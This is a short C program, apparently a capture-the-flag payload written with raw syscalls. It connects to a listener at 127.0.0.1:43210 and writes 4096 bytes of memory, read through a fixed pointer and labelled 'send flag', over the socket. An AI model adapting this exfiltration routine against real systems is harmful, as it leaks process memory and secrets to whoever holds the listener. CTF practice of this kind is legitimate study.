#include <endian.h>
#include <asm-generic/poll.h>
#include <netinet/in.h>
#include <limits.h>

#define IP(t,z,y,x)  ((x)|(y)<<8|(z)<<16|(t)<<24)

#define DEST_IP IP(127, 0, 0, 1)
#define DEST_PORT 43210

int sock;

int main(void)
{
    int fd;

    struct sockaddr_in sa;

    sys_close(0);
    sock = sys_socket(PF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        sys__exit(2);
    }
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = htobe32(DEST_IP);
    sa.sin_port = htobe16(DEST_PORT);
    if (sys_connect(sock, (struct kernel_sockaddr *)&sa, sizeof(sa)) < 0) {
        sys__exit(1);
    }

    //send flag
    sys_write(sock, *(unsigned char **)(0x1000c000), 4096);
    sys__exit(0);
}
